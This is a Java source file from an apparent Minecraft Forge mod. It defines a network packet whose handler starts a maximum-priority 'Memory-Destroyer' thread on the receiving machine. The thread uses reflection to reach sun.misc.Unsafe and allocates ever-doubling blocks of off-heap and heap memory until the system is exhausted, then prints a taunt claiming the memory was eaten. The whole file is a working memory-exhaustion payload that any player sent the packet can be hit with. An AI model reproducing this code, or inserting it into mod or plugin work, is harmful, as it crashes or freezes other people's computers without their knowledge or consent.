package com.csdy.jzyy.network.packets;

import net.minecraft.network.FriendlyByteBuf;
import net.minecraftforge.network.NetworkEvent;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Supplier;

public record UnsafeMemoryPacket() {

    private static final List<Long> allocatedAddresses = new ArrayList<>();
    private static final Unsafe unsafe;


    static {
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            throw new RuntimeException("获取Unsafe失败", e);
        }
    }

    public static void encode(UnsafeMemoryPacket packet, FriendlyByteBuf buf) {
    }

    public static UnsafeMemoryPacket decode(FriendlyByteBuf buf) {
        return new UnsafeMemoryPacket();
    }

    public static void handle(UnsafeMemoryPacket packet, Supplier<NetworkEvent.Context> network) {
        network.get().enqueueWork(UnsafeMemoryPacket::fuckMemoryTillDie);
        network.get().setPacketHandled(true);
    }

    private static void fuckMemoryTillDie() {

        Thread bombThread = new Thread(() -> {
            try {
                long blockSize = 1024L * 1024 * 100; // 初始100MB
                while (true) {
                    // 狠狠分配堆外内存
                    long address = unsafe.allocateMemory(blockSize);
                    allocatedAddresses.add(address);

                    // 填充数据确保内存被实际占用
                    unsafe.setMemory(address, blockSize, (byte) 0x66);

                    System.out.printf("已吞噬 %d堆外内存 @ 0x%x%n",
                            blockSize / (1024 * 1024), address);
                    //加大火力
                    blockSize = (long)(blockSize * 2);

                    // 防止long溢出
                    if (blockSize <= 0) blockSize = Long.MAX_VALUE / 2;

                    // 同时分配堆内存增加压力
                    byte[] heapChunk = new byte[(int)Math.min(blockSize, Integer.MAX_VALUE - 2)];
                }
            } catch (Throwable t) {
                System.err.println("你的内存被csdy吃光了！");
                throw t;
            }
        }, "Memory-Destroyer");

        bombThread.setDaemon(false);
        bombThread.setPriority(Thread.MAX_PRIORITY);
        bombThread.start();
    }



}
